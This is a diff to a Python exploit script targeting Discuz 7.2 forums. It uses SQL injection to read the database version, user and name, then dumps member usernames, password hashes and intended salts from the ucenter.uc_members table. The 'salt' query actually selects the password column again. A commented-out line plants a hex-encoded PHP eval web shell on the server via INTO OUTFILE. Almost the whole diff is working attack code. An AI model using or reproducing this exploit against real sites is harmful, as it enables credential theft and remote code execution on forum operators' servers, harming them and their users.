@@ -32,7 +32,7 @@ def usage():
   if len(sys.argv) < 2:
     print ''
     print 'Usage:' 
-    print '  python diz7.2.py [url] '
+    print '  python diz7.2.py [url] [num=10]'
     sys.exit(1)
 
 
@@ -40,26 +40,40 @@ def main():
     usage()
 
     url = sys.argv[1]
-    url = "http://172.16.28.132/Discuz/Discuz_7.2_SC_UTF8/upload"
+    if len(sys.argv) <= 2:
+        getnum = 10
+    else:
+        getnum = int(sys.argv[2])
+
     dbversion = gethtml(url, "version()")
     dbuser = gethtml(url, "user()")
     dbdatabase = gethtml(url, "database()")
-
     dblen = gethtml(url, "select count(password) from cdb_members ")
-    cdb_members_username = []
-    cdb_members_password = []
 
-    for loop in range(int(dblen)):
-        username_list = "select username from cdb_members limit %d,1" % loop
-        password_list = "select password from cdb_members limit %d,1" % loop
-        cdb_members_username.append(gethtml(url, username_list))
-        cdb_members_password.append(gethtml(url, password_list))
-
+    print
     print dbversion
     print dbuser
     print dbdatabase
-    print cdb_members_username
-    print cdb_members_password
+    print dblen
+    print 
+
+    for loop in range(int(dblen)):
+        if loop > getnum:
+            break
+        try:
+            #username_list = "select concat_ws('@',username,password,salt) from ucenter.uc_members limit %d,1" % loop
+            #password_list = "select password from ucenter.uc_members limit %d,1" % loop
+            username = gethtml(url, "select username from ucenter.uc_members limit %d,1" % loop)
+            password = gethtml(url, "select password from ucenter.uc_members limit %d,1" % loop)
+            salt = gethtml(url, "select password from ucenter.uc_members limit %d,1" % loop)
+
+            print "[%-2d] user: %-15s password: %s salt: %s" % (loop+1, username, password, salt)
+        except Exception,e:
+            print e
+            continue
+
+
+    #gethtml(url, "select 0x3c3f706870206576616c28245f524551554553545b636d645d293b3f3e into outfile 'C:/www/ok.php'")
 #main()
 
 
